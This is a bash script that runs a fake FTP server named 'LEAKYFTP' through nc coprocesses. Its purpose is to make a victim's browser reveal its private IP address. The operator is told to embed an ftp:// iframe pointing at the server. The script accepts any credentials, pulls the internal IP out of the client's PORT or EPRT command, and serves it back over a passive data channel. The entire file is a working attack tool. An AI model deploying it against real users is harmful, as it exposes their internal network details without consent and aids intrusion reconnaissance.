#!/bin/bash

function usage {
    cat <<-!
Usage:
    $0 server_ip data_channel_port=11111 [DEBUG_MODE=0] [FTP_PORT=2121]
!
}

function debug_print {
    [[ -n $debug_mode ]] && echo "${*}" >&2
}

function leakyftp {
    local fdin=$1 fdout=$2 cmd_in connection_info elapsed_time ip=
    
    function write_data {
        printf '%s\r\n' "$1" >&$fdout
    }
    
    function read_data {
        local data time_start time_end
        time_start=$(date +%s%N|sed -E 's/.{6}$//')
        read -r -t 5 data <&$fdin
        time_end=$(date +%s%N|sed -E 's/.{6}$//')
        printf "%s %s" $((time_end-time_start)) "${data}"|sed 's/\r$//'
    }
    
    read client_info <&$fdin
    debug_print $client_info
    write_data "220 LEAKYFTP"

    cmd_in=x
    while [[ -n $cmd_in ]];do
        read elapsed_time cmd_in < <(read_data)
        debug_print "Received: $cmd_in in ${elapsed_time}"
        case $cmd_in in
            USER*)
                write_data "331 User name okay, need password."
                ;;
            PASS*)
                write_data "230 Login successful"
                ;;
            CWD*)
                write_data "250 Directory successfully changed."
                ;;
            LIST*)
                write_data "226 Directory send OK."
                ;;
            PWD*)
                write_data "257 /"
                ;;
            SIZE*)
                write_data "213 213"
                ;;
            SYST*)
                write_data "555 UNIX Type: L8"
                ;;
            "TYPE I"*)
                write_data "200 Switching to Binary mode"
                ;;
            "TYPE A"*)
                write_data "200 Switching to ASCII mode"
                ;;
            PASV*)
                [[ -z ${3+x} ]] && {
                    write_data "502 What is this"
                    :
                } || {
                    connection_info=$(printf %s,%s,%s $(echo $server_ip|tr '.' ,) $((data_channel_port/256)) $((data_channel_port%256)))
                    echo ${3} | timeout 2 nc -lvp $data_channel_port &
                    write_data "227 Entering PASSIVE Mode ($connection_info)"
                }
                ;;
            EPSV*|AUTH*)
                write_data "502 What is this"
                ;;
            PORT*)
                #PORT x,x,x,x,157,193
                debug_print "$cmd_in"
                IFS=" ," read -a parts < <(echo "$cmd_in")
                ip=$(IFS=.;echo "${parts[*]:1:4}")
                break
                ;;
            EPRT*)
                #EPRT |1|x.x.x.x|38473| for ipv4
                debug_print "$cmd_in"
                IFS="|" read _ _ ip _ < <(echo "$cmd_in")
                break
                ;;
            *)
                write_data "200 200"
        esac
    done
    [[ -n $ip ]] && echo $ip
}

[[ $1 == -h || $1 == --help ]] && {
    usage
    exit
}

server_ip=$1
[[ -z "${1+x}" ]] && {
    server_ip=$(curl -s ifconfig.me)
}
data_channel_port=${2:-11111}
debug_mode=${3:-23}
ftp_port=${4:-2121}

echo "Set the server:ip in the iframe to: ftp://${server_ip}:${ftp_port}" >&2

exec {outfd}>&1
{ coproc fds_control (nc -lnvp $ftp_port 2>&1) } 2>/dev/null
read <&${fds_control[0]}

ip=$(leakyftp ${fds_control[0]} ${fds_control[1]})
echo Private IP: $ip

{ coproc fds_data (nc -lnvp $ftp_port 2>&1) } 2>/dev/null
read <&${fds_data[0]}

leakyftp ${fds_data[0]} ${fds_data[1]} $ip

{
    kill -9 ${fds_control_PID}
    kill -9 ${fds_data_PID}
} 2> /dev/null